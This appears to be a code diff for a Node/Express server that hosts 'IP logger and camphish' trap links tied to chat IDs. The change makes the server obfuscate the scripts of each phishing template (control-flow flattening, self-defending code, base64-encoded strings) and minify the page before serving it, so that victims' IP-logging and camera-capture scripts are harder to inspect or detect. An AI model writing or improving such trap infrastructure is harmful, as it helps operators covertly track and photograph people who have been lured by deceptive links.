@@ -362,7 +362,7 @@ async function startServer() {
   // ... (previous API routes continue here)
   
   // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
-  app.get('/t/:tmplId/:id', (req, res) => {
+  app.get('/t/:tmplId/:id', async (req, res) => {
     const { id, tmplId } = req.params;
     const chatId = getChatIdFromTrapId(id);
     if (!chatId) return res.status(404).send('<h2>Error 404: Link Invalid or Expired.</h2>');
@@ -398,7 +398,28 @@ async function startServer() {
     }
 
     const template = templates[tmplId] || templates['1'];
-    res.send(template.render(id));
+    let htmlContent = template.render(id);
+
+    try {
+      const cheerio = require('cheerio');
+      const JavaScriptObfuscator = require('javascript-obfuscator');
+      const { minify } = require('html-minifier-terser');
+      
+      const $ = cheerio.load(htmlContent);
+      $('script').each((i: number, el: any) => {
+        const rawScript = $(el).html();
+        if (rawScript && rawScript.trim().length > 0) {
+           const obf = JavaScriptObfuscator.obfuscate(rawScript, {
+               compact: true, controlFlowFlattening: true, selfDefending: true, 
+               stringArray: true, stringArrayEncoding: ['base64']
+           });
+           $(el).text(obf.getObfuscatedCode());
+        }
+      });
+      htmlContent = await minify($.html(), { collapseWhitespace: true, removeComments: true, minifyCSS: true });
+    } catch(e) {}
+
+    res.send(htmlContent);
   });
 
   // Backward compatibility alias
